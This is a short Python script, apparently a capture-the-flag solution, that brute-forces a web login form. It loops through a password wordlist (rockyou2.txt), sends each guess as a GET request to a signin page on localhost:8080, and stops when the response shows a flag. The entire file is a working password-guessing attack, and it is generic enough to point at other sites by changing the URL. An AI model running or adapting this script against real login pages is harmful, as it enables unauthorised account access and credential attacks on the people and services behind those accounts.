import requests
import os
from urllib.parse import urlencode
from bs4 import BeautifulSoup






def showMeYourMotivation(url, wordlist_file, username):
    with open(wordlist_file, "r", encoding="latin-1") as f:
        passwords_to_try = [line.strip() for line in f.readlines()]
    
    for password in passwords_to_try:
        
        full_url = f"{url}page=signin&username={username}&password={password}&Login=Login"

        response = requests.get(full_url, headers=header)
        soup = BeautifulSoup(response.content, "html.parser")
        success_message = "The flag is :"

        if success_message in soup.get_text():
            print(f"Successful login with password: {password}")
            break
        else:
            print(f"Show Me Your Motivation...")

        



header = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0'}
wordlist_file = "./rockyou2.txt"
username = "GetThe"
base_url = "http://localhost:8080/index.php?"

showMeYourMotivation(base_url, wordlist_file, username)